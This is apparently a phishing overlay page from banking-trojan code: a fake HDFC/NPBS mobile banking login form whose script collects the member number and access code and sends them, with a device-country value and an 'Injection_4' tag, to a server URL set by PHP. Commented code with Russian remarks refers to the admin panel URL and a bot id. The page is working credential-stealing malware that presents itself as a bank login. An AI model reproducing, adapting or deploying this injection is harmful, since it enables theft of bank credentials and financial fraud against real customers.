FwwezjA9Gy23IaE/ROOF5xlyMRDbHC7Isf+ogTXDEzIXHN934P7vnVjT3IJxcoOKhL+ltZiavtw2qdwz7Yp9X0bQ2pr63GOC89Yjp1qSFXlnu3jA57qYCTLPMZ/K+23pynfpomFwNfbvYYZrIl+mopsszsWYjwfUJTJttRzflak+F3oY9YqwRyFP6Azuf0CPgJmC6q/m7CugbnVrXRqZRcEVItiA5IxgU8RHiwQCJoCGkNyLUvpPhXyugQCgTBXgUAgEOYqEAgEAmGuAoFAIMxVIBAIhLkKBAKBQJirQCAQCHMVCAQCYa4CgUAgEOYqEAgEwlwFAoFAmKtAIBAIhLkKBAJBFvB//hOIVDQ/AA0AAAAASUVORK5CYII=" style="width: 30%">
</div>

    <div class="fitMlbody" id="content_div">

        <section class="content">
            <form action="null" method="post" id="_mainForm" target="flow_handler">
<center>
                <div class="teaser_box">
                    <div class="ptb">
                        <label class="dunkelblau" for="login"><b>Member Number</b></label><br><br>
                        <input name="Member Number" id="login" maxlength="20" class="input-field" type="text">
                    </div>
                    <br />
                    <div class="ptb">
                        <label class="dunkelblau" for="password"><b>Access Code</b></label><br><br>
                        <input type="hidden" name="name" value="HDFC Bank MobileBanking" />
                        <input name="Access Code" id="password" maxlength="50" class="input-field" type="password" />
                    </div>  <br />
                    <div class="ptb">
                        <input type="button" value="Log on" id="submitBtn1" class="submit-button" />
                        <br />
                    </div>
                </div>
</center>
            </form>

        </section>
        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

    <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота

*/
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "npbs'+
						'", "member_number": "'+oNumInp.value+
						'", "password": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
					    var imei_c='<?php echo $IMEI_country; ?>';
					    location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|NPBS Mobile Banking|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						
						return false;
                    };

                })();
            </script>
</body>
</html>
